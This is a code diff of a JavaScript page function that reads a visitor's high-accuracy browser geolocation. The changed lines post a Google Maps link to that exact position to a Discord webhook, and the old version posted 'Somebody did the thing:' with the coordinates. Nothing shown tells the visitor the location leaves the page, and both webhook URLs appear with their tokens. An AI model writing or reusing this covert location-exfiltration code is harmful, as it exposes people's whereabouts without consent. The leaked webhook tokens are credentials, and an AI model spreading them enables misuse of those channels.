@@ -26,8 +26,8 @@ function getGeoCoords() {
             long.innerText = "Longitude: " + position.coords.longitude;
             coords.appendChild(lat);
             coords.appendChild(long)
-            sendDiscordMessage('https://discord.com/api/webhooks/1086011482518601889/iNo9jf7sYweE-Ix0Xaol1x9r78m_XavcVSBeLI-FokpDVgCB25EU0ffixsPXEwM4Ez0W',
-                'Somebody did the thing:' + lat.innerText + ' ' + long.innerText)
+            sendPostToWebhook('https://discord.com/api/webhooks/1086054283583172670/H6fcVtnwZXQEFnixHKR1W_lJPzSqlngQ3OuiPM05gFbFyd0mm1Gc7pXzbCtnXCw9BYvW',
+                `https://www.google.com/maps/@${position.coords.latitude},${position.coords.longitude},17.5z`)
             spanify(lat, long)
         }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });
 
@@ -36,7 +36,7 @@ function getGeoCoords() {
     }
     return coords
 }
-function sendDiscordMessage(webHookURL, message) {
+function sendPostToWebhook(webHookURL, message) {
     var xhr = new XMLHttpRequest();
     xhr.open("POST", webHookURL, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
